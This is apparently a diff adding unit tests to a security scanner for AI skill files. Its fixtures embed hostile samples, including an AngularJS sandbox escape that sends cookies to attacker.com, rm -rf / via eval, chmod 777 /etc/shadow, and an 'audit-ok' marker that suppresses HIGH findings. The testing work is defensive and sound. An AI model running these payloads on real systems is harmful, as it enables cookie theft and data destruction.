@@ -549,5 +549,277 @@ class SkillSecurityAuditorTests(unittest.TestCase):
         )
 
 
+    def test_angularjs_eval_payload_is_not_flagged(self):
+        """AngularJS $eval() is a template sandbox escape, not dangerous eval()."""
+        skill_dir = self._make_skill(
+            textwrap.dedent(
+                """\
+                ---
+                name: demo-skill
+                description: Provides demo
+                license: MIT
+                allowed-tools: []
+                ---
+                """
+            ),
+            {
+                "client-side.md": textwrap.dedent(
+                    """\
+                    ```javascript
+                    {{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,window.location="http://attacker.com/"+document.cookie,a')}}
+                    ```
+                    """
+                )
+            },
+        )
+
+        result = scan_skill(skill_dir)
+
+        self.assertFalse(
+            any(
+                finding["severity"] == "HIGH"
+                and "eval()" in finding["message"]
+                for finding in result["findings"]
+            )
+        )
+
+    def test_angularjs_sandbox_escape_variants_not_flagged(self):
+        """Various AngularJS sandbox escape patterns using $eval or eval('x=...')."""
+        skill_dir = self._make_skill(
+            textwrap.dedent(
+                """\
+                ---
+                name: demo-skill
+                description: Provides demo
+                license: MIT
+                allowed-tools: []
+                ---
+                """
+            ),
+            {
+                "xss.md": textwrap.dedent(
+                    """\
+                    ```javascript
+                    {{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)')}}
+                    {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//')}}
+                    ```
+                    """
+                )
+            },
+        )
+
+        result = scan_skill(skill_dir)
+
+        self.assertFalse(
+            any(
+                finding["severity"] == "HIGH"
+                and "eval()" in finding["message"]
+                for finding in result["findings"]
+            )
+        )
+
+    def test_real_eval_with_user_input_still_flagged(self):
+        """Actual dangerous eval() calls should still be flagged."""
+        skill_dir = self._make_skill(
+            textwrap.dedent(
+                """\
+                ---
+                name: demo-skill
+                description: Provides demo
+                license: MIT
+                allowed-tools: []
+                ---
+                """
+            ),
+            {
+                "danger.md": textwrap.dedent(
+                    """\
+                    ```python
+                    result = eval("__import__('os').system('rm -rf /')")
+                    ```
+                    """
+                )
+            },
+        )
+
+        result = scan_skill(skill_dir)
+
+        self.assertTrue(
+            any(
+                finding["severity"] == "HIGH"
+                and "eval()" in finding["message"]
+                for finding in result["findings"]
+            )
+        )
+
+    def test_ctf_exec_id_is_not_flagged(self):
+        """exec('id') is a standard CTF RCE verification command."""
+        skill_dir = self._make_skill(
+            textwrap.dedent(
+                """\
+                ---
+                name: demo-skill
+                description: Provides demo
+                license: MIT
+                allowed-tools: []
+                ---
+                """
+            ),
+            {
+                "rce.md": textwrap.dedent(
+                    """\
+                    ```php
+                    exec('id');               // 11 chars - also standard
+                    exec('cat /flag');
+                    exec('whoami');
+                    ```
+                    """
+                )
+            },
+        )
+
+        result = scan_skill(skill_dir)
+
+        self.assertFalse(
+            any(
+                finding["severity"] == "HIGH"
+                and "exec()" in finding["message"]
+                for finding in result["findings"]
+            )
+        )
+
+    def test_chmod_777_tmp_is_not_flagged(self):
+        """chmod 777 /tmp/ is standard in kernel exploitation examples."""
+        skill_dir = self._make_skill(
+            textwrap.dedent(
+                """\
+                ---
+                name: demo-skill
+                description: Provides demo
+                license: MIT
+                allowed-tools: []
+                ---
+                """
+            ),
+            {
+                "kernel.md": textwrap.dedent(
+                    """\
+                    ```bash
+                    echo 'chmod 777 /tmp/output' >> /tmp/evil.sh
+                    ```
+                    """
+                )
+            },
+        )
+
+        result = scan_skill(skill_dir)
+
+        self.assertFalse(
+            any(
+                finding["severity"] == "HIGH"
+                and "chmod" in finding["message"]
+                for finding in result["findings"]
+            )
+        )
+
+    def test_chmod_777_system_path_still_flagged(self):
+        """chmod 777 on actual system paths should still be flagged."""
+        skill_dir = self._make_skill(
+            textwrap.dedent(
+                """\
+                ---
+                name: demo-skill
+                description: Provides demo
+                license: MIT
+                allowed-tools: []
+                ---
+                """
+            ),
+            {
+                "danger.md": textwrap.dedent(
+                    """\
+                    ```bash
+                    chmod 777 /etc/shadow
+                    ```
+                    """
+                )
+            },
+        )
+
+        result = scan_skill(skill_dir)
+
+        self.assertTrue(
+            any(
+                finding["severity"] == "HIGH"
+                and "World-writable" in finding["message"]
+                for finding in result["findings"]
+            )
+        )
+
+    def test_audit_ok_suppresses_high_finding(self):
+        """The <!-- audit-ok --> marker suppresses HIGH findings on that line."""
+        skill_dir = self._make_skill(
+            textwrap.dedent(
+                """\
+                ---
+                name: demo-skill
+                description: Provides demo
+                license: MIT
+                allowed-tools: []
+                ---
+                """
+            ),
+            {
+                "example.md": textwrap.dedent(
+                    """\
+                    ```python
+                    eval("complex_expression")  <!-- audit-ok: CTF payload example -->
+                    ```
+                    """
+                )
+            },
+        )
+
+        result = scan_skill(skill_dir)
+
+        self.assertFalse(
+            any(
+                finding["severity"] == "HIGH"
+                and "eval()" in finding["message"]
+                for finding in result["findings"]
+            )
+        )
+
+    def test_audit_ok_does_not_suppress_critical(self):
+        """The <!-- audit-ok --> marker does NOT suppress CRITICAL findings."""
+        skill_dir = self._make_skill(
+            textwrap.dedent(
+                """\
+                ---
+                name: demo-skill
+                description: Provides demo
+                license: MIT
+                allowed-tools: []
+                ---
+                """
+            ),
+            {
+                "danger.md": textwrap.dedent(
+                    """\
+                    ```bash
+                    rm -rf /  <!-- audit-ok: this should still be caught -->
+                    ```
+                    """
+                )
+            },
+        )
+
+        result = scan_skill(skill_dir)
+
+        self.assertTrue(
+            any(finding["severity"] == "CRITICAL" for finding in result["findings"])
+        )
+
+
 if __name__ == "__main__":
     unittest.main()
